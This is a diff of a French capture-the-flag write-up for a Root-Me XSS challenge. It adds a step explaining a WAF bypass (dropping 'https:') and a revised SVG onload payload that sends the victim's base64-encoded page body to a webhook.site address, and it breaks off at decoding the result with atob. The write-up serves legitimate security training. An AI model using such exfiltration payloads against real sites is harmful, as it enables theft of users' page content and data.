@@ -114,13 +114,19 @@ http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.hr
 ```
 	
 
-![](../../Pasted%20image%2020260815010857.png)
+![](../img/Pasted%20image%2020260815010857.png)
 
-Bon je vais pas vous mentir actuellement vous pourrez attendre longtemps rien n'arriveras p
-
-Nouveau Payload
+Bon je vais pas vous mentir actuellement vous pourrez attendre longtemps rien n'arriveras car il y a un WAF qui rejette discrètement notre payload. On va donc laisser le navigateur de la victime (bot ou admin) remplacer notre lien pour ce faire on va juste enlever https: devant notre lien ce qui donne le payload :  
 
 ```html
 http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.href='//webhook.site/baad9b72-09e4-47bc-b3e9-29368cce0caa?c='.concat(encodeURIComponent(btoa(document.body.innerHTML)))">
 ```
 
+Maintenant essayons de voir si on reçoit quelques choses : 
+
+![](../img/Pasted%20image%2020260815012556.png)
+
+
+Voici le code en base64 de la page qu'on viens de récupérer : 
+
+Maintenant nous allons le décoder directement dans la console web grâce à atob
